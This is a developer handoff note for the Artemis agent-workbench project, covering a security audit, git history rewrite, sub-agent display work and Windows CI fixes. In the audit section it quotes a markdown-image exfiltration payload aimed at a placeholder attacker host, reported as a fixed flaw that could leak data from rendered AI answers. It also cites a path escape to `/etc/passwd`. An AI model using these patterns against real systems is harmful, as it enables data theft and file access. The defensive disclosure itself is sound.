# Handoff, 2026-08-11

Artemis went public, shipped M11b, and got CI green on three platforms for the
first time. This file is the short version. [MILESTONES.md](MILESTONES.md) is the
full record.

Repository: https://github.com/c-wenlong/artemis (public, MIT)
Head: `52c6c9b`, `main` in sync with origin, working tree clean.

## Where things stand

- [x] Pre-public audit complete, no credentials found in any commit
- [x] Git history rewritten, remote rebuilt, old repository deleted
- [x] Repository public
- [x] M11b sub-agents shipped
- [x] CI green on Ubuntu, macOS and Windows, twice consecutively
- [ ] Branch protection rule making CI required (a repo setting, yours to make)
- [ ] Signed macOS builds (needs an Apple Developer ID)
- [ ] Windows terminal output (broken, cause unknown)
- [ ] A live opencode sub-agent turn (five attempts, all timed out)

Tests: 325 front end, 212 Rust, 9 ignored by design (they need a live agent).

## What was done

### 1. The security audit, and going public

Every text blob in every commit was scanned. No credentials of any kind, ever.
One real vulnerability turned up and was fixed: rendered markdown loaded remote
images, so an answer containing `![](https://attacker/p.png?leak=...)` would make
a request the moment the transcript painted, with no click. Images are now
described and never fetched. A CSP was added, which had been explicitly `null`.

History was a different problem. All 36 commits carried the author's home
directory, three real project names and two student identifiers. A force push
would not have removed them, because GitHub keeps unreachable commits fetchable
by SHA until it garbage collects. So the remote was rebuilt from the rewritten
history and the original repository deleted, then verified by asking GitHub for
three pre-rewrite SHAs, all of which returned 404.

[scripts/scrub-history.sh](scripts/scrub-history.sh) does the rewrite. Testing it
found three defects in my own first version, including a committed `.pyc` that
embedded the entire token list and was skipped by both the scrubber and its
verification pass, so the scrub would have reported success and left the data in
a blob.

### 2. M11b, sub-agents

A fan-out now reads as named participants. Each sub-agent gets a chip with its
name, a colour hashed from its id, `started working` while live and `ran N tools`
when finished. Its calls stay out of the main thread until the chip is clicked.

The design came from reading 164 real `task` calls in opencode's session store
rather than from documentation, which has been wrong every time it was checked.
Two things came out of that:

1. A sub-agent is not a nested stream. Delegation goes through one tool named
   `task`, and the child runs in a separate session whose calls never appear in
   the parent's output. The `task` call is the whole of what a transcript can
   attribute.
2. `state.metadata.sessionId` is the child session id and resolved to a real
   child session in all 164 cases. That is the identity worth grouping on,
   because two `explore` workers share both a name and a tool name.

Codex and Claude attribution is not built. Neither capture contains a sub-agent
frame, and guessing at a shape is what the 164 calls were read to avoid.

### 3. CI, and what it found

Making the repository public gave it free Actions minutes, which is what
unblocked CI after five runs that died on billing without executing a step.
Eleven rounds later it is green. Three of the findings were real product bugs
that no amount of local testing on one machine would have shown.

| Bug | Consequence |
|---|---|
| `/etc/passwd` is not absolute on Windows, and `join` replaces a rooted path instead of appending | An agent could name a file outside the workspace and have it read |
| A project id used as a directory name stayed drive qualified, so `join` discarded the worktrees root | Worktrees were created inside the repository, which the comparison feature deletes as losers |
| The webview chose `/bin/zsh` for the terminal | The dock could not open a shell on Windows at all |

The other eight were tests carrying a POSIX or single machine assumption. One of
them, `scrollback_is_bounded_so_a_chatty_process_cannot_grow_forever`, had never
tested anything on any platform: it wrote 43 KB against a 256 KiB bound so
nothing was ever dropped, and asserted on `line-1\n`, which a PTY never emits
because it ends lines with CRLF on Unix too. Two mistakes cancelling out.
Normalising line endings for Windows is what made it capable of failing.

## What is next

In the order I would do them.

1. **Set branch protection** so CI is required on `main`. Repository settings,
   Branches, protect `main`, require the `check` job. Two minutes, and it is the
   last item on M14.
2. **Run Artemis on Windows.** Two open defects need the platform and nothing
   else, and both are recorded in [MILESTONES.md](MILESTONES.md) rather than
   quietly omitted:
   - Terminal output does not work. Every output reading test returns exactly
     ConPTY's cursor probe and nothing the child wrote. It reproduces with a
     shell and with a plain program, so it is neither shell syntax nor line
     endings. Five tests are `#[cfg(unix)]` until someone can debug it. Start by
     removing those gates and running `cargo test --test pty`.
   - CRLF behaviour in diff, comparison and Undo is untested against a real CRLF
     checkout. Two fixtures now pin `core.autocrlf` off, which makes the tests
     honest and says nothing about a user whose working tree genuinely is CRLF.
3. **Capture a live opencode sub-agent turn.** Five attempts produced zero bytes
   because `--format json` buffers until the turn ends. Try `opencode serve` and
   read the event stream instead of the CLI's stdout.
4. **M11b for Codex and Claude**, once a capture shows how either reports a
   sub-agent. Blocked on evidence, not on effort.
5. **Signing and notarization**, which needs an Apple Developer ID.
   [docs/RELEASING.md](docs/RELEASING.md) lists the exact secrets.

## Things I got wrong

Worth knowing about, because they cost real time.

- I pushed `97c0dc6` with the repository audit already failing, and did not
  notice until CI ran.
- I pushed `3cced13` without re-running the suite after a late edit.
- I made two wrong Windows diagnoses in a row on the worktree failure. The first
  compared a checked-out file against one that never was, the second blamed 8.3
  short names. Both came from reasoning about the invariant instead of reading
  the paths. The one round I spent printing them found the real bug immediately.
- Both Windows path bugs had the same shape, and I did not see it until the
  second one: a derived string used as a path segment turns out to be absolute
  somewhere, and `join` silently obeys. Both were deny-lists of forbidden
  characters. Both are now allow-lists.

## Ground rules that stayed in force

- Tests before and after, verified red first, on every milestone.
- Real captures over documentation. Documentation was wrong every time.
- Quiver's files are read only, always.
- No personal data, credentials, or real project names in the repository.
